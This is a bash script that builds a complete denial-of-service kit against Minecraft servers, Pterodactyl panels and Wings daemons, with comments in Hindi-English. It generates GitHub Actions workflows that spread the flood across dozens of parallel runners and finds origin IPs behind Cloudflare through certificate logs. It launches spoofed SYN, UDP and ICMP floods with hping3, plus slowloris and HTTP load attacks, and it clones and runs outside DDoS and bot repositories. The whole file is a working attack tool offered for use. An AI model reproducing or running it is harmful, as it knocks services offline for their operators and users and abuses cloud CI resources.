#!/usr/bin/env bash
# mcstrike.sh — one-file MC strike kit
#
#   bash mcstrike.sh --init [repo-name]     # repo + workflows banao
#   sudo bash mcstrike.sh 1 <ip|domain> 300 # mode 1 = mc server
#   sudo bash mcstrike.sh 2 <ip|domain> 300 # mode 2 = panel
#   sudo bash mcstrike.sh 3 <ip|domain> 300 # mode 3 = wings
#   bash mcstrike.sh --recon <ip|domain>    # sirf recon
#
# env: BOTS=100  AUTO_ORIGIN=1

set -u
SELF="$(readlink -f "$0")"
CF_RE='^(104\.(1[6-9]|2[0-9]|3[01])\.|172\.(6[4-9]|7[0-1])\.|188\.114\.)'
IP=""; SRV_PORT=""; PIDS=(); BOTS="${BOTS:-100}"; AUTO_ORIGIN="${AUTO_ORIGIN:-1}"

say(){ echo "[*] $*"; }
ok(){  echo "[+] $*"; }
warn(){ echo "[!] $*"; }
die(){ echo "[x] $*"; exit 1; }

if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi
cleanup(){ for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null; done; }
trap cleanup EXIT INT TERM

# ---------------- init ----------------
do_init(){
  local name="${1:-mcstrike}"
  command -v git >/dev/null || die "git chahiye"
  mkdir -p .github/workflows || die "mkdir fail"

  cp "$SELF" ./mcstrike.sh 2>/dev/null || true
  chmod +x ./mcstrike.sh

  cat > .github/workflows/strike.yml <<'YAML'
name: strike
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'IP ya domain'
        required: true
      mode:
        description: '1=mc server  2=panel  3=wings'
        required: true
        default: '1'
      duration:
        description: 'seconds'
        required: true
        default: '300'

jobs:
  go:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    strategy:
      max-parallel: 25
      fail-fast: false
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]
    steps:
      - uses: actions/checkout@v4
      - name: strike
        env:
          AUTO_ORIGIN: '1'
          BOTS: '100'
        run: sudo -E bash ./mcstrike.sh "${{ inputs.mode }}" "${{ inputs.target }}" "${{ inputs.duration }}"
YAML

  cat > .github/workflows/bots.yml <<'YAML'
name: bots
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'IP ya domain'
        required: true
      port:
        description: 'port'
        required: true
        default: '25565'
      duration:
        description: 'seconds'
        required: true
        default: '300'

jobs:
  bots:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    strategy:
      max-parallel: 40
      fail-fast: false
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40]
    steps:
      - name: setup
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq python3 python3-pip git
          git clone -q --depth 1 https://github.com/AdrianKilis/CloudBurst /tmp/cb
          pip3 install -q -r /tmp/cb/requirements.txt --break-system-packages
      - name: run
        run: |
          python3 /tmp/cb/main.py --host ${{ inputs.target }} --port ${{ inputs.port }} \
            --bots 100 --duration ${{ inputs.duration }}
YAML

  cat > README.md <<'MD'
# mcstrike

Actions tab > strike > Run workflow. target daalo, mode chuno, Run.

| mode | kya | chain |
|---|---|---|
| 1 | Minecraft | SRV resolve, java/bedrock auto, SYN/UDP + ICMP + bots |
| 2 | Pterodactyl panel | /auth/login probe, slowloris + hey + SYN |
| 3 | Wings | /api/system, h2load + SYN |

Public repo zaroori hai (unlimited minutes). Cloudflare detect hone par
script crt.sh se origin khud nikaal ke use karti hai.

Server 3-4 min baad bhi khada hai to `bots` workflow chalao, port manual.
MD

  printf '.DS_Store\n*.pcap\n' > .gitignore

  git init -q 2>/dev/null || true
  git add -A
  git -c user.email=a@b -c user.name=a commit -qm init 2>/dev/null || true
  git branch -M main 2>/dev/null || true

  echo
  ok "repo files ready"
  if command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then
    say "gh mila — public repo bana raha hoon"
    gh repo create "$name" --public --source=. --push && ok "push ho gaya" && \
      echo "  -> https://github.com/$(gh api user -q .login)/$name/actions"
  else
    echo "  gh nahi mila. manually:"
    echo "    git remote add origin https://github.com/<tum>/$name.git"
    echo "    git push -u origin main"
  fi
  exit 0
}

# ---------------- recon ----------------
is_ip(){ [[ "$1" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; }
tcp_open(){ timeout 3 bash -c ">/dev/tcp/$1/$2" 2>/dev/null; }
udp_open(){ nmap -sU -Pn --open -p "$2" --host-timeout 10s "$1" 2>/dev/null | grep -q " open"; }

origin_scan(){
  local cands
  say "origin scan crt.sh"
  cands=$(curl -s -m 20 "https://crt.sh/?q=%25.$1&output=json" \
    | grep -oE '"name_value":"[^"]+"' | cut -d'"' -f4 | sed 's/\*\.//' | sort -u \
    | while read -r h; do dig +short "$h" A 2>/dev/null | head -1; done \
    | grep -E '^[0-9]+\.' | grep -vE "$CF_RE" | sort -u | head -5)
  [ -z "$cands" ] && { warn "koi non-CF IP nahi mila"; return; }
  warn "candidates:"; echo "$cands" | sed 's/^/    /'
  [ "$AUTO_ORIGIN" = "1" ] || return
  for c in $cands; do
    if tcp_open "$c" 25565 || tcp_open "$c" 8080 || tcp_open "$c" 8443; then
      warn "origin use: $c"; IP="$c"; return
    fi
  done
  warn "candidate port band — proxy IP par hi chalega"
}

resolve(){
  if is_ip "$TARGET"; then IP="$TARGET"; return; fi
  say "resolve $TARGET"
  local srv host
  srv=$(dig +short "_minecraft._tcp.$TARGET" SRV 2>/dev/null | head -1)
  if [ -n "$srv" ]; then
    host=$(echo "$srv" | awk '{print $4}' | sed 's/\.$//'); SRV_PORT=$(echo "$srv" | awk '{print $3}')
    ok "SRV -> $host:$SRV_PORT"; IP=$(dig +short "$host" A 2>/dev/null | head -1)
  else
    IP=$(dig +short "$TARGET" A 2>/dev/null | head -1)
  fi
  [ -n "${IP:-}" ] || die "resolve fail"
  ok "IP -> $IP"
  if [[ "$IP" =~ $CF_RE ]]; then warn "CLOUDFLARE proxy IP — origin dhoondh raha hoon"; origin_scan "$TARGET"; fi
}

# ---------------- traffic ----------------
verify(){
  ( $SUDO timeout "$DUR" tcpdump -ni any "host $IP" -w /tmp/cap.pcap >/dev/null 2>&1 ) & PIDS+=($!)
  sleep 4
  local c; c=$( $SUDO timeout 5 tcpdump -ni any "host $IP" 2>/dev/null | wc -l )
  say "5s sample: $c packets"
  if [ "$c" -gt 500 ]; then ok "TRAFFIC CONFIRMED"; else warn "traffic LOW — port/origin check karo"; fi
}
fl_tcp(){ $SUDO hping3 -S --rand-source -i u20000 -p "$1" "$IP" >/dev/null 2>&1 & PIDS+=($!); }
fl_udp(){ $SUDO hping3 --udp --rand-source -i u20000 -p "$1" "$IP" >/dev/null 2>&1 & PIDS+=($!); }
fl_icmp(){ $SUDO hping3 --icmp --rand-source -i u15000 "$IP" >/dev/null 2>&1 & PIDS+=($!); }

getcb(){ [ -d /tmp/CloudBurst ] || git clone -q --depth 1 https://github.com/AdrianKilis/CloudBurst /tmp/CloudBurst; }
getmcpe(){ [ -d /tmp/MCPE ] || git clone -q --depth 1 https://github.com/ZeroBone/MCPE-DDoS /tmp/MCPE; }
getslow(){ [ -d /tmp/slowloris ] || git clone -q --depth 1 https://github.com/gkbrk/slowloris /tmp/slowloris; }
http_load(){ if command -v hey >/dev/null; then hey -z "${DUR}s" -c 250 "$1"; else ab -n 200000 -c 250 "$1"; fi; }

# ---------------- modes ----------------
mode1(){
  local jp="${SRV_PORT:-25565}"
  if tcp_open "$IP" "$jp"; then ok "JAVA $jp -> SYN + ICMP + bots"; fl_tcp "$jp"; fl_icmp; verify
    getcb; pip3 install -q -r /tmp/CloudBurst/requirements.txt --break-system-packages 2>/dev/null
    python3 /tmp/CloudBurst/main.py --host "$IP" --port "$jp" --bots "$BOTS" --duration "$DUR"
  elif udp_open "$IP" 19132; then ok "BEDROCK 19132 -> UDP + MCPE bots"; fl_udp 19132; verify
    getmcpe; python3 /tmp/MCPE/mcpe.py "$IP" 19132 100 "$DUR"
  else warn "dono band — java default"; fl_tcp "$jp"; verify; fi
}
find_http(){ local p; for p in 8443 8080 443 80; do
    curl -sk -m 4 -o /dev/null -w '%{http_code}' "https://$IP:$p/auth/login" 2>/dev/null | grep -qE '^[23]' && { echo "$p"; return; }
    curl -s  -m 4 -o /dev/null -w '%{http_code}' "http://$IP:$p/auth/login"  2>/dev/null | grep -qE '^[23]' && { echo "$p"; return; }
  done; }
mode2(){
  local p; p=$(find_http)
  [ -n "$p" ] || { warn "koi http port nahi"; fl_tcp 8080; verify; return; }
  ok "PANEL $p live"; fl_tcp "$p"; verify
  getslow; ( python3 /tmp/slowloris/slowloris.py "$IP" -p "$p" -s 600 >/dev/null 2>&1 ) & PIDS+=($!)
  local u; [ "$p" = "443" ] || [ "$p" = "8443" ] && u="https://$IP:$p/auth/login" || u="http://$IP:$p/auth/login"
  ( http_load "$u" >/dev/null 2>&1 ) & PIDS+=($!)
  sleep "$DUR"
}
mode3(){
  local p=""
  tcp_open "$IP" 8443 && p=8443; [ -z "$p" ] && tcp_open "$IP" 8080 && p=8080
  [ -z "$p" ] && { warn "8443/8080 band"; fl_tcp 8443; verify; return; }
  ok "WINGS $p live"; fl_tcp "$p"; verify
  if [ "$p" = "8443" ] && command -v h2load >/dev/null; then
    ( h2load -c 300 -n 200000 -t 4 "https://$IP:$p/api/system" >/dev/null 2>&1 ) & PIDS+=($!)
  else
    ( http_load "http://$IP:$p/api/system" >/dev/null 2>&1 ) & PIDS+=($!)
  fi
  sleep "$DUR"
}

# ---------------- dispatch ----------------
case "${1:-}" in
  --init) do_init "${2:-mcstrike}" ;;
  --recon)
    TARGET="${2:-}"; [ -n "$TARGET" ] || die "target do"
    resolve; nmap -Pn --open -p 25565,19132,80,443,8080,8443 "$IP" 2>/dev/null | grep -E '^[0-9]' || true ;;
  1|2|3)
    MODE="$1"; TARGET="${2:-}"; DUR="${3:-300}"
    [ -n "$TARGET" ] || die "target do"
    echo "=========================================="
    echo " mcstrike mode=$MODE target=$TARGET dur=${DUR}s"
    echo "=========================================="
    command -v hping3 >/dev/null || { say "deps install"; $SUDO apt-get update -qq; $SUDO apt-get install -y -qq hping3 netsniff-ng python3 python3-pip git curl dnsutils nmap tcpdump apache2-utils >/dev/null 2>&1; }
    command -v hey >/dev/null || curl -sL https://github.com/rakyll/hey/releases/latest/download/hey_linux_amd64 -o /tmp/hey 2>/dev/null && chmod +x /tmp/hey 2>/dev/null && $SUDO mv /tmp/hey /usr/local/bin/hey 2>/dev/null
    resolve; ok "final IP: $IP"
    nmap -Pn --open -p 25565,19132,80,443,8080,8443 "$IP" 2>/dev/null | grep -E '^[0-9]' || true
    echo "------------------------------------------"
    case "$MODE" in 1) mode1 ;; 2) mode2 ;; 3) mode3 ;; esac ;;
  *) echo "usage:"; echo "  bash mcstrike.sh --init [repo]"; echo "  sudo bash mcstrike.sh <1|2|3> <ip|domain> [dur]"; echo "  bash mcstrike.sh --recon <ip|domain>"; exit 1 ;;
esac
